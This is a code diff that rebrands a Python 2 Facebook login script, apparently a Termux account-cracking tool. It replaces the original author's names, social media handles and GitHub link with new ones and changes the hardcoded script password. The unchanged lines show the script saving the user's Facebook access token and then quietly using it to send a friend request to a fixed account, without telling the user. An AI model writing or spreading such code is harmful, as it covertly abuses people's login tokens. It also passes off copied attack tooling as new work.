@@ -49,17 +49,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
+|__(~)    •||•AIK - THA -LARKA------•◈•
+|__\~~) •||•UMAIR - KHALID---------------•◈•
+|__(-----\  •◈•------UDAAS-FIRKA--------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mUMAIR KHALID
+\033[1;96mInstagram \033[1;93m: \033[1;Kharoos29
+\033[1;96mFacebook  \033[1;93m: \033[1; Paindo9099
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/AikThaLarka/udaas
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +80,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mUmair Khalid
+\033[1;96mInstagram \033[1;93m: \033[1;92mKharoos29
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Paindo9099
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/AikThaLarka/udaas
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Kharoos"
+CorrectPassword = "Kharoos"
 
 loop = 'true'
 while (loop == 'true'):
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/Paindo9099')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
